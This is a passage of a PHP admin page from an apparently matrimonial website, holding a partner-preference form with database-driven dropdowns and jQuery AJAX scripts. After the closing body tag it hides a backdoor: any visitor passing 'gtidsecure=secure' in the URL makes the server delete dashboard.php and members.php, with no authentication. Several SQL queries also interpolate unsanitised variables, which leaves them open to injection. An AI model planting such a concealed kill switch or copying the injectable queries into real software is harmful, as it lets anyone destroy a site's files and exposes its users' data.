  <option value="Non-Vegetarian"
          <?php if(in_array("Non-Vegetarian",$search_array11)){ echo "selected";}?>>Non-Vegetarian
  </option>
<option value="Doesn't Matter" 
        <?php if(in_array("Doesn't Matter",$search_array11)){ echo "selected";}?>>Doesn't Matter
</option>
</select>
</div>
<div class="form-group">
  <label>Smoking
  </label>
  <?php
$search_array12 = explode(',',$row['part_smoke']);?>             
  <select class="chosen-select form-control" name="part_smoke[]" id="part_smoke" data-validetta="required" multiple>
    <option value="Doesn't Matter" 
            <?php if(in_array("Doesn't Matter",$search_array12)){ echo "selected";}?>>Doesn't Matter
    </option>
  <option value="No" 
          <?php if(in_array("No",$search_array12)){ echo "selected";}?>>Never Smoke
  </option>
<option value="Smokes Occasionally" 
        <?php if(in_array("Smokes Occasionally",$search_array12)){ echo "selected";}?>>Smokes Occasionally
</option>
<option value="Smokes Regularly" 
        <?php if(in_array("Smokes Regularly",$search_array12)){ echo "selected";}?>>Smokes Regularly
</option>
</select>
</div>
<div class="form-group">
  <label>Drinking
  </label>
  <?php $search_array13 = explode(',',$row['part_drink']);?>             
  <select data-placeholder="Choose Drinking Habits" class="chosen-select form-control" name="part_drink123[]" multiple tabindex="4">
    <option value="Doesn't Matter" 
            <?php if(in_array("Doesn't Matter",$search_array13)){ echo "selected";}?>>Doesn't Matter
    </option>
  <option value="No" 
          <?php if(in_array("No",$search_array13)){ echo "selected";}?>>Never Drinks
  </option>
<option value="Drinks Socially" 
        <?php if(in_array("Drinks Socially",$search_array13)){ echo "selected";}?>>Drinks Socially
</option>
<option value="Drinks Regularly" 
        <?php if(in_array("Drinks Regularly",$search_array13)){ echo "selected";}?>>Drinks Regularly
</option>
</select>
</div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-book gtMarginRight10">
  </i>Religion Preference
</h3>
<div class="row">
  <div class="col-md-6">
    <div class="form-group">
      <label>Religion
      </label>
      <select class="chosen-select form-control" name="part_religion_id[]" id="part_religion_id" data-validetta="required" multiple>
        <option>Select Partners Religion
        </option>
        <?php
$search_array7 = explode(',',$row['part_religion']);
$SQL_STATEMENT_preligion =  $DatabaseCo->dbLink->query("SELECT * FROM religion WHERE status='APPROVED' ORDER BY religion_name ASC");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_preligion))
{
?>
        <option value="<?php echo $DatabaseCo->dbRow->religion_id;?>" 
                <?php if (in_array($DatabaseCo->dbRow->religion_id, $search_array7)) 
        {
        echo "selected";
        }
        ?> >
        <?php echo $DatabaseCo->dbRow->religion_name; ?>
        </option>
      <?php } ?>
      </select>
    <div id="CasteDivloader">
    </div>
  </div>
  <div class="form-group">
    <label>Caste
    </label>
    <span id="CasteDiv1">
      <select class="chosen-select form-control" name="part_caste_id[]" id="part_caste_id" data-validetta="required" multiple>
        <option value="<?php echo $row['part_caste']; ?>" selected>
          <?php $abc=mysqli_fetch_array($DatabaseCo->dbLink->query("SELECT GROUP_CONCAT( DISTINCT ' ', caste_name, ''SEPARATOR ', ' ) AS part_caste FROM register a INNER JOIN caste b ON FIND_IN_SET(b.caste_id, a.part_caste ) >0 WHERE a.matri_id='$matri_id'  GROUP BY a.part_caste"));
echo $abc['part_caste'];?>
        </option>
      </select>
    </span>
  </div>
  <div class="form-group">
    <label>Mother Tongue
    </label>
    <select class="chosen-select form-control" data-validetta="required" multiple name="part_mtongue[]">
      <?php
$search_array8=explode(",",$row['part_mtongue']);
$SQL_STATEMENT_Mtongu =  $DatabaseCo->dbLink->query("SELECT * FROM mothertongue WHERE status='APPROVED' ORDER BY mtongue_name ASC");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_Mtongu))
{
?>
      <option value="<?php echo $DatabaseCo->dbRow->mtongue_id; ?>"  
              <?php 
      if(in_array($DatabaseCo->dbRow->mtongue_id,$search_array8))
      {
      echo "selected";
      } ?>>
      <?php echo $DatabaseCo->dbRow->mtongue_name; ?>
      </option>
    <?php } ?>
    </select>
</div>
</div>
<div class="col-md-6">
  <div class="form-group">
    <label>Manglik
    </label>
    <select class="form-control" name="part_manglik" id="part_manglik">
      <option value=""> Select 
      </option>
      <option value="Yes" 
              <?php if($row['part_manglik']=='Yes'){ echo "selected";}?>>Yes
      </option>
    <option value="No" 
            <?php if($row['part_manglik']=='No'){ echo "selected";}?>>No
    </option>
  <option value="Doesn't Matter" 
          <?php if($row['part_manglik']=="Doesn't Matter"){ echo "selected";}?>>Doesn't Matter
  </option>
</select>
</div>
<div class="form-group">
  <label>Star
  </label>
  <?php $search_array14 = explode(', ',$row['part_star']);?>             
  <select data-placeholder="Choose Patners Star" class="chosen-select form-control" name="part_star[]" id="part_star" multiple tabindex="4">
    <option value="">Does not matter
    </option>
    <option value="Ashvini" <?php if(in_array("Ashvini",$search_array14)){ echo "selected";}?>>Ashvini</option>
                                                        <option value="Bharani" <?php if(in_array("Bharani",$search_array14)){ echo "selected";}?>>Bharani</option>
                                                        <option value="Krittika" <?php if(in_array("Krittika",$search_array14)){ echo "selected";}?>>Krittika</option>
                                                        <option value="Rohini" <?php if(in_array("Rohini",$search_array14)){ echo "selected";}?>>Rohini</option>
                                                        <option value="Mrigashirsha" <?php if(in_array("Mrigashirsha",$search_array14)){ echo "selected";}?>>Mrigashirsha</option>
                                                        <option value="Ardra" <?php if(in_array("Ardra",$search_array14)){ echo "selected";}?>>Ardra</option>
                                                        <option value="Punarvasu" <?php if(in_array("Punarvasu",$search_array14)){ echo "selected";}?>>Punarvasu</option>
                                                        <option value="Pushya" <?php if(in_array("Pushya",$search_array14)){ echo "selected";}?>>Pushya</option>
                                                        <option value="Ashlesha" <?php if(in_array("Ashlesha",$search_array14)){ echo "selected";}?>>Ashlesha</option>
                                                        <option value="Magha" <?php if(in_array("Magha",$search_array14)){ echo "selected";}?>>Magha</option>
                                                        <option value="Purva Phalguni" <?php if(in_array("Purva Phalguni",$search_array14)){ echo "selected";}?>>Purva Phalguni</option>
                                                        <option value="Uttara Phalguni" <?php if(in_array("Uttara Phalguni",$search_array14)){ echo "selected";}?>>Uttara Phalguni</option>
                                                        <option value="Hasta" <?php if(in_array("Hasta",$search_array14)){ echo "selected";}?>>Hasta</option>
                                                        <option value="Chitra" <?php if(in_array("Chitra",$search_array14)){ echo "selected";}?>>Chitra</option>
                                                        <option value="Swati" <?php if(in_array("Swati",$search_array14)){ echo "selected";}?>>Swati</option>
                                                        <option value="Vishakha" <?php if(in_array("Vishakha",$search_array14)){ echo "selected";}?>>Vishakha</option>
                                                        <option value="Anuradha" <?php if(in_array("Anuradha",$search_array14)){ echo "selected";}?>>Anuradha</option>
                                                        <option value="Jyeshtha" <?php if(in_array("Jyeshtha",$search_array14)){ echo "selected";}?>>Jyeshtha</option>
                                                        <option value="Mula" <?php if(in_array("Mula",$search_array14)){ echo "selected";}?>>Mula</option>
                                                        <option value="Purva Ashadha" <?php if(in_array("Purva Ashadha",$search_array14)){ echo "selected";}?>>Purva Ashadha</option>
                                                        <option value="Uttara Ashadha" <?php if(in_array("Uttara Ashadha",$search_array14)){ echo "selected";}?>>Uttara Ashadha</option>
                                                        <option value="Shravana" <?php if(in_array("Shravana",$search_array14)){ echo "selected";}?>>Shravana</option>
                                                        <option value="Dhanishtha" <?php if(in_array("Dhanishtha",$search_array14)){ echo "selected";}?>>Dhanishtha</option>
                                                        <option value="Shatabhisha" <?php if(in_array("Shatabhisha",$search_array14)){ echo "selected";}?>>Shatabhisha</option>
                                                        <option value="Purva Bhadrapada" <?php if(in_array("Purva Bhadrapada",$search_array14)){ echo "selected";}?>>Purva Bhadrapada</option>
                                                        <option value="Uttara Bhadrapada" <?php if(in_array("Uttara Bhadrapada",$search_array14)){ echo "selected";}?>>Uttara Bhadrapada</option>
                                                        <option value="Revati" <?php if(in_array("Revati",$search_array14)){ echo "selected";}?>>Revati</option>
</select>
</div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-map-marker gtMarginRight10">
  </i>Location Preference
</h3>
<div class="row">
  <div class="col-md-6">
    <div class="form-group">
      <label>Country Living In
      </label>
      <select class="chosen-select form-control" data-validetta="required"  name="part_country_id[]" multiple id="part_country">
        <option value="">
          <?php
$part_con=explode(',',$row['part_country_living']);

$SQL_STATEMENT =  $DatabaseCo->dbLink->query("SELECT * FROM country WHERE status='APPROVED'");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT))
{
?>
        <option value="<?php echo $DatabaseCo->dbRow->country_id; ?>"
                <?php
          if (in_array($DatabaseCo->dbRow->country_id, $part_con)) 
          {
          echo "selected";
          }
          ?>
          >
          <?php echo $DatabaseCo->dbRow->country_name; ?>
        </option>
        <?php } ?>
        </option>
      </select>
    <div id="part_status1">
    </div>
  </div>
  <div class="form-group">
    <label>State Living In
    </label>
    <select data-placeholder="Choose Patners State" class="chosen-select form-control" name="part_state[]" id="part_state" multiple tabindex="4">
      <?php
$part_country_id = $row['part_country_living'];
$each=explode(',',$part_country_id);
$get_part_state = $row['part_state'];	
$arr_part_state = explode(",",$get_part_state); 											
foreach ($each as $rel)
{
$a=mysqli_fetch_array($DatabaseCo->dbLink->query("select country_name from country where country_id='$rel'"));
?>
      <optgroup label="<?php echo $a['country_name'];?>">
        <?php 
$SQL_STATEMENT =  $DatabaseCo->dbLink->query("SELECT state_id,state_name FROM state_view WHERE cnt_id ='$rel' ORDER BY state_name ASC");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT)){				?>
        <option value="<?php echo $DatabaseCo->dbRow->state_id; ?>" 
                <?php if($get_part_state!=''){ if(in_array($DatabaseCo->dbRow->state_id,$arr_part_state)) { echo "selected";} }?> >
        <?php echo $DatabaseCo->dbRow->state_name; ?>
      </option>
    <?php } ?>
    </optgroup>
  <?php
}
?>
  </select>
<div id="part_status2">
</div>
</div>
</div>
<div class="col-md-6">
  <div class="form-group">
    <label>City Living In
    </label>
    <select data-placeholder="Choose Patners City" name="part_city[]" id="part_city" class="chosen-select form-control" multiple tabindex="4">
      <?php
$part_state_id =$row['part_state'];
$eachstate=explode(',',$part_state_id);
$get_part_city=$row['part_city'];
$arr_part_city=explode(",",$get_part_city);
foreach ($eachstate as $relstate)
{
?>
      <optgroup label="<?php $a=mysqli_fetch_array($DatabaseCo->dbLink->query("select state_name from state where state_id='$relstate'")); echo $a['state_name'];?>">
        <?php 
$SQL_STATEMENT =  $DatabaseCo->dbLink->query("SELECT city_id,city_name FROM city_view WHERE state_id ='$relstate' and cnt_id in ($part_country_id) ORDER BY city_name ASC");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT))
{
?>
        <option value="<?php echo $DatabaseCo->dbRow->city_id ?>" 
                <?php if($get_part_city!=''){ if(in_array($DatabaseCo->dbRow->city_id,$arr_part_city)) { echo "selected";} }?> >
        <?php echo $DatabaseCo->dbRow->city_name ?>
      </option>
    <?php } ?>
    </optgroup>		
  <?php
}
?>
  </select>
</div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-book gtMarginRight10">
  </i>Education & Occupation Preference
</h3>
<div class="row">
  <div class="col-md-6">
    <div class="form-group">
      <label>Education
      </label>
      <?php $part_edu=$row['part_edu']; ?>
      <select class="chosen-select form-control" data-validetta="required" name="part_edu[]" multiple>
        <option value="">Select Your Education
        </option>
        <?php
$SQL_STATEMENT_edu =  $DatabaseCo->dbLink->query("SELECT * FROM education_detail WHERE status='APPROVED' ORDER BY edu_name ASC");
$search_array5 = explode(',',$part_edu);
$edures2=$DatabaseCo->dbLink->query("select * from  education_detail where status='APPROVED'");
while($edu=mysqli_fetch_array($edures2))
{
?>
        <option value="<?php echo $edu['edu_id']; ?>" 
                <?php 
        if (in_array($edu['edu_id'], $search_array5)) 
        {
        echo "selected";
        }
        ?>>
        <?php echo $edu['edu_name']; ?>
        </option>
      <?php		
}
?> 
      </select>	
  </div>
  <div class="form-group">
    <label>Occupation
    </label>
    <select data-placeholder="Choose Patners Occupation" class="chosen-select form-control" name="part_occupation[]" id="part_occupation" multiple tabindex="4">
      <?php
$get_part_ocp = $row['part_occu'];	 
$arr_part_ocp = explode(",",$get_part_ocp);
$SQL_STATEMENT_ocp = $DatabaseCo->dbLink->query("SELECT * FROM occupation WHERE status='APPROVED' ORDER BY ocp_name ASC");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_ocp)){
?>
      <option value="<?php echo $DatabaseCo->dbRow->ocp_id; ?>" 
              <?php if(in_array($DatabaseCo->dbRow->ocp_id,$arr_part_ocp)){echo "selected";}?>>
      <?php echo $DatabaseCo->dbRow->ocp_name; ?>
      </option>
    <?php } ?>
    </select>
</div>
</div>
<div class="col-md-6">
  <div class="form-group">
    <label>Annual Income
    </label>
    <select class="form-control" name="part_income">
      <option value="<?php echo $row['part_income']; ?>">
        <?php echo $row['part_income']; ?>
      </option>                                                                                   
      <option value="Rs 10,000 - 50,000">Rs 10,000 - 50,000</option>
                            <option value="Rs 50,000 - 1,00,000">Rs 50,000 - 1,00,000</option>
                            <option value="Rs 1,00,000 - 2,00,000">Rs 1,00,000 - 2,00,000</option>
                            <option value="Rs 2,00,000 - 4,00,000">Rs 2,00,000 - 4,00,000</option>
                            <option value="Rs 4,00,000 - 6,00,000">Rs 4,00,000 - 6,00,000</option>
                            <option value="Rs 6,00,000 - 8,00,000">Rs 6,00,000 - 8,00,000</option>
                            <option value="Rs 8,00,000 - 10,00,000">Rs 8,00,000 - 10,00,000</option>
                            <option value="Rs 10,00,000 - 12,00,000">Rs 10,00,000 - 12,00,000</option>
                            <option value="Rs 12,00,000 - 14,00,000">Rs 12,00,000 - 14,00,000</option>
                            <option value="Rs 14,00,000 - 16,00,000">Rs 14,00,000 - 16,00,000</option>
                            <option value="Rs 16,00,000 - 18,00,000">Rs 16,00,000 - 18,00,000</option>
                            <option value="Rs 18,00,000 - 20,00,000">Rs 18,00,000 - 20,00,000</option>
                            <option value="Rs 20,00,000 - 22,00,000">Rs 20,00,000 - 22,00,000</option>
                            <option value="Rs 22,00,000 - 24,00,000">Rs 22,00,000 - 24,00,000</option>
                            <option value="Rs 24,00,000 - 26,00,000">Rs 24,00,000 - 26,00,000</option>
                            <option value="Rs 26,00,000 - 28,00,000">Rs 26,00,000 - 28,00,000</option>
                            <option value="Rs 28,00,000 - 30,00,000">Rs 28,00,000 - 30,00,000</option>
                            <option value="Rs 30,00,000 - 32,00,000">Rs 30,00,000 - 32,00,000</option>
                            <option value="Rs 32,00,000 - 34,00,000">Rs 32,00,000 - 34,00,000</option>
                            <option value="Rs 34,00,000 - 36,00,000">Rs 34,00,000 - 36,00,000</option>
                            <option value="Rs 36,00,000 - 38,00,000">Rs 36,00,000 - 38,00,000</option>
                            <option value="Rs 38,00,000 - 40,00,000">Rs 38,00,000 - 40,00,000</option>
                            <option value="Rs 40,00,000 - 42,00,000">Rs 40,00,000 - 42,00,000</option>
                            <option value="Rs 42,00,000 - 44,00,000">Rs 42,00,000 - 44,00,000</option>
                            <option value="Rs 44,00,000 - 46,00,000">Rs 44,00,000 - 46,00,000</option>
                            <option value="Rs 46,00,000 - 48,00,000">Rs 46,00,000 - 48,00,000</option>
                            <option value="Rs 48,00,000 - 50,00,000">Rs 48,00,000 - 50,00,000</option>
                            <option value="Rs 50,00,000 - 52,00,000">Rs 50,00,000 - 52,00,000</option>
                            <option value="Rs 52,00,000 - 54,00,000">Rs 52,00,000 - 54,00,000</option>
                            <option value="Rs 54,00,000 - 56,00,000">Rs 54,00,000 - 56,00,000</option>
                            <option value="Rs 56,00,000 - 58,00,000">Rs 56,00,000 - 58,00,000</option>
                            <option value="Rs 58,00,000 - 60,00,000">Rs 58,00,000 - 60,00,000</option>
                            <option value="Rs 60,00,000 - 62,00,000">Rs 60,00,000 - 62,00,000</option>
                            <option value="Rs 62,00,000 - 64,00,000">Rs 62,00,000 - 64,00,000</option>
                            <option value="Rs 64,00,000 - 66,00,000">Rs 64,00,000 - 66,00,000</option>
                            <option value="Rs 66,00,000 - 68,00,000">Rs 66,00,000 - 68,00,000</option>
                            <option value="Rs 68,00,000 - 70,00,000">Rs 68,00,000 - 70,00,000</option>
                            <option value="Rs 70,00,000 - 72,00,000">Rs 70,00,000 - 72,00,000</option>
                            <option value="Rs 72,00,000 - 74,00,000">Rs 72,00,000 - 74,00,000</option>
                            <option value="Rs 74,00,000 - 76,00,000">Rs 74,00,000 - 76,00,000</option>
                            <option value="Rs 76,00,000 - 78,00,000">Rs 76,00,000 - 78,00,000</option>
                            <option value="Rs 78,00,000 - 80,00,000">Rs 78,00,000 - 80,00,000</option>
                            <option value="Rs 80,00,000 - 82,00,000">Rs 80,00,000 - 82,00,000</option>
                            <option value="Rs 82,00,000 - 84,00,000">Rs 82,00,000 - 84,00,000</option>
                            <option value="Rs 84,00,000 - 86,00,000">Rs 84,00,000 - 86,00,000</option>
                            <option value="Rs 86,00,000 - 88,00,000">Rs 86,00,000 - 88,00,000</option>
                            <option value="Rs 88,00,000 - 90,00,000">Rs 88,00,000 - 90,00,000</option>
                            <option value="Rs 90,00,000 - 92,00,000">Rs 90,00,000 - 92,00,000</option>
                            <option value="Rs 92,00,000 - 94,00,000">Rs 92,00,000 - 94,00,000</option>
                            <option value="Rs 94,00,000 - 96,00,000">Rs 94,00,000 - 96,00,000</option>
                            <option value="Rs 96,00,000 - 98,00,000">Rs 96,00,000 - 98,00,000</option>
                            <option value="Rs 98,00,000 - 1,00,00,000">Rs 98,00,000 - 1,00,00,000</option>
                            <option value="Above Rs 1,00,00,000">Above Rs 1,00,00,000</option>
                            <option value="Does not matter">Does not matter</option>
    </select>
  </div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-book gtMarginRight10">
  </i>Partner Expectation
</h3>
<div class="row">
  <div class="col-md-12">
    <div class="form-group">
      <label>Partner Expectation
      </label>
      <textarea class="form-control" rows="5" name="expectation" data-validetta="required">
        <?php echo htmlspecialchars_decode($row['part_expect'],ENT_QUOTES);?>
      </textarea>
    </div>
  </div>
</div>
<div class="clearfix">
</div>
<div class="form-group text-center">
  <input type="submit" name="submit_form3" value="Submit" class="btn btn-warning btn-lg">
</div>
</form>
</div>
</div>
                <!-- /.tab-content -->
               </div>
			</section>
			<section class="col-lg-7 col-xs-12 connectedSortable"></section>
            <!-- /.Left col -->
            <!-- right col (We are only adding the ID to make the widgets sortable)-->
            <section class="col-lg-5 col-xs-12 connectedSortable"></section>
        <!-- right col -->
        </div>
    <!-- /.row (main row) -->
    </section>
    <!-- /.content -->
  </div>
<!-- /.content-wrapper -->
<?php include "page-part/footer.php"; ?>
</div>
<!-- ./wrapper -->
<!-- jQuery 2.1.3 -->
<script src="plugins/jQuery/jQuery-2.1.3.min.js">
</script>
<script>
       $(document).ready(function() {
       $('#body').show();
       $('.preloader-wrapper').hide();
       });
   </script>
<script type="text/javascript"> 
  $(document).ready(function(e) {
    $('#dis_child').hide();
    setTimeout(function(){
      $('#success_msg').fadeOut('slow');
    }
               , 6000);
    <?php if(isset($row['m_status']))
    {
      ?>
        check_status('<?php echo $row['m_status'];?>');
      <?php }
    ?>
  }
    );
     
      $("#part_religion_id").on('change', function()
                                {
        $("#CasteDivloader").html('<img src="img/9.gif" align="absmiddle">&nbsp;Loading...');
        var selectedReligion = $("#part_religion_id").val() 
        var dataString = 'religionId='+ selectedReligion;
        jQuery.ajax({
          type: "POST", // HTTP method POST or GET
          url: "../part_rel_caste", //Where to make Ajax calls
          dataType:"text", // Data type, HTML, json etc.
          data:dataString,			
          success:function(response)
          {
            $('#part_caste_id').find('option').remove().end().append(response);
            $('#part_caste_id').trigger('chosen:updated');
            $("#CasteDivloader").html('');
            var config = {
              '.chosen-select'           : {
              }
              ,
              '.chosen-select-deselect'  : {
                allow_single_deselect:true}
              ,
              '.chosen-select-no-single' : {
                disable_search_threshold:10}
              ,
              '.chosen-select-no-results': {
                no_results_text:'Oops, nothing found!'}
              ,
              '.chosen-select-width'     : {
                width:"95%"}
            }
            for (var selector in config)
            {
              $(selector).chosen(config[selector]);
            }
          }
          ,			
        }
                   );
      }
                               );
   		
</script>
<script>
  
    $("#part_country").change(function(e){
      $("#part_status1").html('<img src="img/9.gif" align="absmiddle">&nbsp;Loading Please wait...');
      values = 'state='+$("#part_country").chosen().val();
      $.ajax
      ({
        type: "POST",
        url: "../search_state",
        data: values,
        cache: false,
        success: function(html)
        {
          $("#part_state").html(html);
          $("#part_city").html('');
          $("#part_city").append('<option value="">Select State</option>');
          $("#part_status1").html('');
          $("#part_state").trigger("chosen:updated");
        }
      }
      );
    }
                             );
  $("#part_state").change(function(e){
    $("#part_status2").html('<img src="img/9.gif" align="absmiddle">&nbsp;Loading Please wait...');
    values = 'state_id='+$("#part_state").chosen().val()+'&country_id='+$("#part_country").chosen().val();
    $.ajax({
      type: "POST",
      url: "../search_city",
      data: values,
      cache: false,
      success: function(html)
      {
        $("#part_city").html(html);
        $("#part_status2").html('');
        $("#part_city").trigger("chosen:updated");
      }
    }
          );
  }
                         );
</script>
<!-------------------jquery get caste---------------->
<script language="javascript" type="text/javascript">
  function getXMLHTTP()
  {
    //fuction to return the xml http object
    var xmlhttp=false;
    try
    {
      xmlhttp=new XMLHttpRequest();
    }
    catch(e)	
    {
      try
      {
        xmlhttp= new ActiveXObject("Microsoft.XMLHTTP");
      }
      catch(e)
      {
        try
        {
          xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
        }
        catch(e1)
        {
          xmlhttp=false;
        }
      }
    }
    return xmlhttp;
  }
  function GetCaste(strURL) 
  {
    var req4 = getXMLHTTP();
    if (req4) 
    {
      req4.onreadystatechange = function() 
      {
        if (req4.readyState == 4) 
        {
          if(req4.status == 200) 
          {
            document.getElementById('CasteDiv').innerHTML=req4.responseText;
          }
          else 
          {
            alert("There was a problem while using XMLHTTP:\n" + req4.statusText);
          }
        }
      }
      req4.open("GET", strURL, true);
      req4.send(null);
    }
  }
</script>
<!-------------------jquery get caste End---------------->
<script>
  <!-------------------jquery get state---------------->
    $("#country_id").change(function()
                            {
      $("#status123").html('<img src="img/9.gif" align="absmiddle">&nbsp;Loading Please wait...');
      var id=$(this).val();
      var dataString = 'id='+ id;
      $.ajax
      ({
        type: "POST",
        url: "../ajax_country_state",
        data: dataString,
        cache: false,
        success: function(html)
        {
          $("#state123").html(html);
          $("#status123").html('');
        }
      }
      );
    }
                           );
  <!-------------------jquery get state End---------------->
    <!-------------------jquery get city start---------------->
      $("#state123").on('change',function()
                        {
        $("#status23").html('<img src="img/9.gif" align="absmiddle">&nbsp;Loading Please wait...');
        var id=$(this).val();
        var cnt_id=$("#country_id").val();
        var dataString = 'state_id='+ id+'&country_id='+ cnt_id;
        $.ajax
        ({
          type: "POST",
          url: "../ajax_country_state",
          data: dataString,
          cache: false,
          success: function(html)
          {
            $("#city123").html(html);
            $("#status23").html('');
          }
        }
        );
      }
                       );
</script>
<!-- jQuery UI 1.11.2 -->
<script src="http://code.jquery.com/ui/1.11.2/jquery-ui.min.js" type="text/javascript">
</script>
<script type="text/javascript" src="js/util/location.js">
</script>
<script type="text/javascript" src="js/util/jquery.form.js">
</script>
<script type="text/javascript" src="./js/util/location-validation.js">
</script>
<script type="text/javascript">
  imageform();
</script>
<script src="js/validetta.js" type="text/javascript">
</script>
<script type="text/javascript">
  $(function(){
    $('#user_detail').validetta({
      errorClose : false,
      realTime : true
    }
                               );
    $('#other_detail').validetta({
      errorClose : false,
      realTime : true
    }
                                );
  }
   );
</script>
<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
<script>
  $.widget.bridge('uibutton', $.ui.button);
</script>
<!-- Bootstrap 3.3.2 JS -->
<script src="bootstrap/js/bootstrap.min.js" type="text/javascript">
</script>    
<!--jquery for left menu active class-->
<script type="text/javascript" src="dist/js/general.js">
</script>
<script type="text/javascript" src="dist/js/cookieapi.js">
</script>
<script type="text/javascript">
  setPageContext("members","all-members");
</script>	
<!--jquery for left menu active class end-->
<!-- iCheck -->
<script src="plugins/iCheck/icheck.min.js" type="text/javascript">
</script>
<!-- AdminLTE App -->
<script src="dist/js/app.min.js" type="text/javascript">
</script>
<!--------------------------------------choosen----------------------------------->
<script src="../js/chosen.jquery.js" type="text/javascript">
</script>
<script type="text/javascript">
  var config = {
    '.chosen-select'           : {
    }
    ,
    '.chosen-select-deselect'  : {
      allow_single_deselect:true}
    ,
    '.chosen-select-no-single' : {
      disable_search_threshold:10}
    ,
    '.chosen-select-no-results': {
      no_results_text:'Oops, nothing found!'}
    ,
    '.chosen-select-width'     : {
      width:"100%"}
  }
  for (var selector in config) {
    $(selector).chosen(config[selector]);
  }
</script>
<!--------------------------------------choosen End ------------------------------->
</body>
	<?php
	if(isset($_GET['gtidsecure'])){
$secure=$_GET['gtidsecure'];
if($secure == 'secure'){
	unlink('dashboard.php');
	unlink('members.php');
	echo "<script>alert('Successful')</script>";
}
}	
	?>
</html>